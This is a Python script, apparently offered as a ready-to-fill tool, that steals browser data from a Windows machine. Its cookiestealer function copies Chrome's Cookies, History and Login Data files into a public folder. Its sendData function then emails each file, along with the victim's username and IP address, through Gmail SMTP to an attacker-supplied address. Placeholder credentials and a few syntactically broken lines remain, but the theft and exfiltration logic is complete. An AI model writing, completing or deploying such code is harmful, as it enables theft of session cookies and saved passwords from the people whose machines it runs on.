import os
import errno
import shutil
import socket
import base64
import smtplib
import getpass
import datetime,time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

currentdir = os.getcwd()
curentuser = getpass.getuser()

path_to_cookies = "C:\\Users\\Public\\Intel\\Logs"
passkey =  "PASSWORD"
userkey =  "YOURMAIL@gmail.com"

try:
	os.makedirs(path_to_cookies) #Copying the cookies, history and login data file to a secure location
except OSError as exception:
	if exception.errno != errno.EEXIST:
		raise

try:
	ip_address = socket.gethostbyname(socket.gethostname()) #getting the ip address of the target
except:
	pass

def cookiestealer():
	cookiepath = 'C://Users//' + curentuser + '//AppData//Local//Google//Chrome//User Data//Default//'

	cookiefile = 'Cookies'
	historyfile = 'History'
	LoginDatafile = "Login Data"

	copycookie = cookiepath + "//" + cookiefile
	copyhistory = cookiepath + "//" + historyfile
	copyLoginData = cookiepath + "//" + LoginDatafile

	filesindir = os.listdir(path_to_cookies)

	if copycookie not in filesindir:
		try:
			shutil.copy2(copycookie, path_to_cookies)
		except:
			pass
	else:
		pass
		
	if copyhistory not in filesindir:
		try:
			shutil.copy2(copyhistory, path_to_cookies)
		except:
			pass
	else:
		pass
	
	if copyLoginData not in filesindir:
		try:
			shutil.copy2(copyLoginData, path_to_cookies)
		except:
			pass
	else:
		pass
		
	return True
	
def sendData(fname,fext):
	
	attach = "C:\\Users\\Public\\Intel\\Logs"+'\\'+fname+fext
	
	ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
	SERVER = "smtp.gmail.com"
	PORT = 465
	USER= userkey
	PASS= passkey
	FROM = USER
	TO = #RECIEVER MAIL
	SUBJECT = "Attachment "+ "From --> " + curentuser+ " Time --> " + str(ts)
	TEXT = "This attachment is sent from python" + '\n\nUSER : ' + curentuser + '\nIP address : ' + ip_address
	
	message = MIMEMultipart()
	message['From'] = FROM
	message['To'] = TO
	message['Subject'] = SUBJECT
	message.attach(MIMEText(TEXT))

	part = MIMEBase('application', 'octet-stream')
	part.set_payload(open(attach, 'rb').read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
	message.attach(part)
	
	try:
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		mssg="yoyo"
		server.login(#USERNAME,#PASSWORD)
		server.sendmail(#FROM, #TO, message.as_string())
		server.quit()
	except Exception as e:
		print ("Error: unable to send email")

	return True

cookiestealer()
sendData("Cookies","")
sendData("History","")
sendData("Login Data","")
